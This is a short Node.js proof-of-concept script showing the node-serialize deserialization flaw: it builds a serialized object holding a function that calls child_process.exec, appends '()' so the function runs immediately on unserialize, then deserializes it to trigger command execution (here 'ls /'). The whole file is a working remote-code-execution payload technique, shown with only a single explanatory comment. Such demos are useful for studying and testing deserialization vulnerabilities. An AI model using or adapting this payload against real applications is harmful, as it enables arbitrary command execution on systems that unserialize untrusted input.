var serialize = require('node-serialize');


// serializing
var y = {
    "rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
var payload_serialized = payload_serialized.replace('{ console.log(stdout) })}', '{ console.log(stdout) })}()') // adding () at the end of the payload so it executes on deserialization
console.log("Serialized: \n" + payload_serialized);


// deserializing
var input = JSON.parse(payload_serialized)
console.log('Unserialized:')
serialize.unserialize(input);
